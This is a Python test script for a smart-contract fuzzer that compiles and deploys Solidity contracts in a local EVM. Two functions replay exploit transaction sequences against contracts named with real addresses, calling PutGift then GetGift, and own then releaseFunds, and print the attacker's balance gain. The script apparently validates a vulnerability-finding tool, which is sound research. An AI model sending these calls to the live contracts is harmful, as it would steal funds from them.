import sys, os
sys.path.append(os.path.join(os.path.dirname(__file__), "../.."))
from pyfuzz.evm import EvmHandler
from pyfuzz.fuzzer.interface import Transaction
import eth_abi

def test():
    evm = EvmHandler()
    with open(os.path.join(os.path.dirname(__file__), '../test/contracts/Test.sol'), 'r') as f:
        text = f.read()
    print("\ncontract\n")
    print(text)
    print("\nTesting getAccounts:\n")
    accounts = evm.getAccounts()
    print(accounts)
    print("\nTesting compile\n")
    contract = evm.compile(text, "Test")
    print("\nTesting deploy\n")
    address = evm.deploy(contract)
    print(address)
    print("\nTesting sendTx\n")
    trace = evm.sendTx(list(accounts.keys())[0], address, "0", contract["functionHashes"]["test1(uint256)"] + "0" * 32)
    for t in trace:
        print(t["op"], end=" ")
    print("\nTesting getAccounts:\n")
    accounts = evm.getAccounts()
    print(accounts)

def test_compile(datadir):
    evm = EvmHandler()
    for _filename in os.listdir(datadir):
        contract_name = _filename.split('.')[0].split('#')[1]
        filename = os.path.join(datadir, _filename)
        with open(filename, 'r') as f:
            text = f.read()
        print(_filename)
        contract = evm.compile(text, contract_name)


def test_exploit_sample(datadir):
    filename = os.path.join(datadir, '0x6f905E47d3e6A9Cc286b8250181Ee5A0441Acc81#PRESENT_1_ETH.sol')
    evm = EvmHandler()
    with open(filename, 'r') as f:
        text = f.read()
    print("contract loaded")
    contract = evm.compile(text, "PRESENT_1_ETH")
    print("compiled")
    address = evm.deploy(contract)
    print("deployed")
    accounts = evm.getAccounts()
    account = list(accounts.keys())[0]
    balance = accounts[account]
    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["PutGift(address)"] + eth_abi.encode_abi(["address"], [account]).hex())
    print("trace:", trace[-1]["op"])
    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["GetGift()"])
    print("trace:", trace[-1]["op"])
    accounts = evm.getAccounts()
    balance_1 = accounts[account]
    print("balance increment:", int(balance_1, 16) - int(balance, 16))

def test_exploit(datadir):
    filename = "0x3C3F481950FA627bb9f39A04bCCdc88f4130795b#EtherBet.sol"
    name = filename.split('.')[0].split('#')[1]
    filename = os.path.join(datadir, filename)
    evm = EvmHandler()
    with open(filename, 'r') as f:
        text = f.read()
    print("contract loaded")
    contract = evm.compile(text, name)
    print("compiled")
    address = evm.deploy(contract)
    print("deployed")
    accounts = evm.getAccounts()
    account = list(accounts.keys())[0]
    balance = accounts[account]
    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["own(address)"] + eth_abi.encode_abi(["address"], [account]).hex())
    print("trace:", [t["op"] for t in trace])
    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["releaseFunds(uint256)"] + eth_abi.encode_abi(["uint256"], [1]).hex())
    print("trace:", [t["op"] for t in trace])
    accounts = evm.getAccounts()
    balance_1 = accounts[account]
    print("balance increment:", int(balance_1, 16) - int(balance, 16))

if __name__ == "__main__":
    # test()
    # test_compile("/home/zqz/teether_contract")
    test_exploit("/home/zqz/teether_contract")